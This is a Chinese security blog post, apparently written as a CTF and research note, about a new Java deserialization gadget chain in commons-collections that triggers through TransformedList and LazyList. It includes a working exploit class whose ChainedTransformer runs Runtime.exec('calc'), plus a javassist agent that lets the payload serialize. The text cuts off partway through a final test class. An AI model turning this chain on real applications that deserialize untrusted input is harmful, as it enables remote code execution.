@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="所用到的类java原生类和common-collections类jdk版本是jdk1.8.0_162看到之前师傅总结的cc链子的图，我去使用CodeQL寻找了一下，发现除了Map，List也能触发。我找了一个可以触发到transform的链子，剩下的作用如InvokerTransform触发二次反序列化没有写，这边使用ChainedTransformer做一个例子调用链： 分析eventListe">
+<meta property="og:type" content="article">
+<meta property="og:title" content="java反序列化漏洞commons-collections-TransformedList触发transform">
+<meta property="og:url" content="http://example.com/2024/04/17/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecommons-collections-TransformedList%E8%A7%A6%E5%8F%91transform/index.html">
+<meta property="og:site_name" content="n1ght的个人主页">
+<meta property="og:description" content="所用到的类java原生类和common-collections类jdk版本是jdk1.8.0_162看到之前师傅总结的cc链子的图，我去使用CodeQL寻找了一下，发现除了Map，List也能触发。我找了一个可以触发到transform的链子，剩下的作用如InvokerTransform触发二次反序列化没有写，这边使用ChainedTransformer做一个例子调用链： 分析eventListe">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/cc.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/af5bb58c61454b608119166297c1545.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240417100346.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240415173408.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240417100444.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240417100557.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240417100928.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240417101043.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240417101102.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240417101133.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/4dcf408d-1377-435e-ae9c-ec8807f75697.gif">
+<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240415174622.png">
+<meta property="article:published_time" content="2024-04-17T09:11:32.000Z">
+<meta property="article:modified_time" content="2024-04-27T12:49:59.005Z">
+<meta property="article:author" content="N1ght">
+<meta property="article:tag" content="java">
+<meta property="article:tag" content="ctf-trick">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/yezere/images/master/cc.jpg">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>java反序列化漏洞commons-collections-TransformedList触发transform</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/yezere/yezere.github.io">项目</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2024/04/25/geekcon-old_log/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2024/04/12/2024%E9%98%BF%E9%87%8C%E4%BA%91ctf-web-chain17%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/04/17/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecommons-collections-TransformedList%E8%A7%A6%E5%8F%91transform/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/04/17/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecommons-collections-TransformedList%E8%A7%A6%E5%8F%91transform/&text=java反序列化漏洞commons-collections-TransformedList触发transform"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/04/17/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecommons-collections-TransformedList%E8%A7%A6%E5%8F%91transform/&title=java反序列化漏洞commons-collections-TransformedList触发transform"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/04/17/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecommons-collections-TransformedList%E8%A7%A6%E5%8F%91transform/&is_video=false&description=java反序列化漏洞commons-collections-TransformedList触发transform"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=java反序列化漏洞commons-collections-TransformedList触发transform&body=Check out this article: http://example.com/2024/04/17/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecommons-collections-TransformedList%E8%A7%A6%E5%8F%91transform/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/04/17/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecommons-collections-TransformedList%E8%A7%A6%E5%8F%91transform/&title=java反序列化漏洞commons-collections-TransformedList触发transform"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/04/17/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecommons-collections-TransformedList%E8%A7%A6%E5%8F%91transform/&title=java反序列化漏洞commons-collections-TransformedList触发transform"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/04/17/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecommons-collections-TransformedList%E8%A7%A6%E5%8F%91transform/&title=java反序列化漏洞commons-collections-TransformedList触发transform"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/04/17/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecommons-collections-TransformedList%E8%A7%A6%E5%8F%91transform/&title=java反序列化漏洞commons-collections-TransformedList触发transform"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/04/17/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecommons-collections-TransformedList%E8%A7%A6%E5%8F%91transform/&name=java反序列化漏洞commons-collections-TransformedList触发transform&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/04/17/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecommons-collections-TransformedList%E8%A7%A6%E5%8F%91transform/&t=java反序列化漏洞commons-collections-TransformedList触发transform"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E6%9E%9C"><span class="toc-number">2.</span> <span class="toc-text">结果</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        java反序列化漏洞commons-collections-TransformedList触发transform
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">N1ght</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-04-17T09:11:32.000Z" class="dt-published" itemprop="datePublished">2024-04-17</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/ctf-trick/" rel="tag">ctf-trick</a>, <a class="p-category" href="/tags/java/" rel="tag">java</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>所用到的类java原生类和common-collections类<br><img src="https://raw.githubusercontent.com/yezere/images/master/cc.jpg"><br>jdk版本是<br>jdk1.8.0_162<br>看到之前师傅总结的cc链子的图，我去使用CodeQL寻找了一下，发现除了Map，List也能触发。<br>我找了一个可以触发到transform的链子，剩下的作用如InvokerTransform触发二次反序列化没有写，这边使用ChainedTransformer做一个例子<br>调用链：<br><img src="https://raw.githubusercontent.com/yezere/images/master/af5bb58c61454b608119166297c1545.png"></p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>eventListener触发CodeSigner的toString方法<br><img src="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240417100346.png"><br><img src="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240415173408.png"><br>signerCertPath.getCertificates().get(0)<br>这一行代码<br><img src="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240417100444.png"><br>调用了signerCertPath的get(0)<br><img src="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240417100557.png"><br>也就是LazyList的get(0)，由于factory用的是</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">ConstantFactory</span>(chainedTransformer)</span><br></pre></td></tr></table></figure>
+<p>所以object就为chainedTransformer<br><img src="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240417100928.png"><br>进入<br><img src="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240417101043.png"><br><img src="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240417101102.png"><br>最后就进入了InvokerTransform的transform<br><img src="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240417101133.png"></p>
+<h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p>由于CertPath重写了writeReplace导致序列化异常，我使用了agent将其hook掉</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n1ght;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;  </span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;  </span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;  </span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;  </span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;  </span><br><span class="line"><span class="keyword">import</span> java.security.cert.CertPath;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoveReplaceTransformer</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;  </span><br><span class="line">        <span class="keyword">if</span>(className.equals(<span class="string">&quot;java/security/cert/CertPath&quot;</span>))&#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                System.out.println(<span class="literal">true</span>);  </span><br><span class="line">                <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();  </span><br><span class="line">                <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;java.security.cert.CertPath&quot;</span>);  </span><br><span class="line">                <span class="type">CtMethod</span> <span class="variable">writeReplace</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;writeReplace&quot;</span>);  </span><br><span class="line">                ctClass.removeMethod(writeReplace);  </span><br><span class="line">                ctClass.detach();  </span><br><span class="line">                <span class="keyword">return</span> ctClass.toBytecode();  </span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;  </span><br><span class="line">                System.out.println(e);;  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span>  classfileBuffer;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>将agent加上</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.web;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantFactory;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.list.LazyList;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.list.TransformedList;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.ListOrderedMap;  </span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;  </span><br><span class="line"><span class="keyword">import</span> sun.security.provider.certpath.X509CertPath;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.swing.event.EventListenerList;  </span><br><span class="line"><span class="keyword">import</span> javax.swing.undo.UndoManager;  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.security.CodeSigner;  </span><br><span class="line"><span class="keyword">import</span> java.util.*;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ccExp</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">        ArrayList&lt;Object&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();  </span><br><span class="line">        list.add(<span class="literal">null</span>);  </span><br><span class="line">        <span class="type">List</span> <span class="variable">decorate1</span> <span class="operator">=</span> TransformedList.decorate(list, chainedTransformer);  </span><br><span class="line">        <span class="type">List</span> <span class="variable">decorate</span> <span class="operator">=</span> LazyList.decorate(decorate1, <span class="keyword">new</span> <span class="title class_">ConstantFactory</span>(chainedTransformer));  </span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="type">ListOrderedMap</span> <span class="variable">decorated</span> <span class="operator">=</span> (ListOrderedMap) ListOrderedMap.decorate(map);  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) field.get((Object) <span class="literal">null</span>);  </span><br><span class="line">        unsafe.putObject(decorated, unsafe.objectFieldOffset(ListOrderedMap.class.getDeclaredField(<span class="string">&quot;insertOrder&quot;</span>)), decorate);  </span><br><span class="line">        <span class="type">X509CertPath</span> <span class="variable">o</span> <span class="operator">=</span> (X509CertPath) unsafe.allocateInstance(X509CertPath.class);  </span><br><span class="line">        unsafe.putObject(o, unsafe.objectFieldOffset(X509CertPath.class.getDeclaredField(<span class="string">&quot;certs&quot;</span>)), decorate);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">o1</span> <span class="operator">=</span> unsafe.allocateInstance(CodeSigner.class);  </span><br><span class="line">        unsafe.putObject(o1, unsafe.objectFieldOffset(CodeSigner.class.getDeclaredField(<span class="string">&quot;signerCertPath&quot;</span>)), o);  </span><br><span class="line">        <span class="type">EventListenerList</span> <span class="variable">list2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EventListenerList</span>();  </span><br><span class="line">        <span class="type">UndoManager</span> <span class="variable">manager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UndoManager</span>();  </span><br><span class="line">        <span class="type">Vector</span> <span class="variable">vector</span> <span class="operator">=</span> (Vector) getFieldValue(manager, <span class="string">&quot;edits&quot;</span>);  </span><br><span class="line">        vector.add(o1);  </span><br><span class="line">        unsafe.putObject(list2,unsafe.objectFieldOffset(list2.getClass().getDeclaredField(<span class="string">&quot;listenerList&quot;</span>)),<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;InternalError.class, manager&#125;);  </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bao).writeObject(list2);  </span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(bao.toByteArray()));  </span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bao.toByteArray());  </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bin).readObject();  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Object obj, String fieldName)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);  </span><br><span class="line">        <span class="keyword">return</span> field.get(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(Class&lt;?&gt; clazz, String fieldName)</span> &#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            field = clazz.getDeclaredField(fieldName);  </span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException var4) &#123;  </span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>) &#123;  </span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> field;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>将base64编码内容，序列化<br><img src="https://raw.githubusercontent.com/yezere/images/master/4dcf408d-1377-435e-ae9c-ec8807f75697.gif"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span 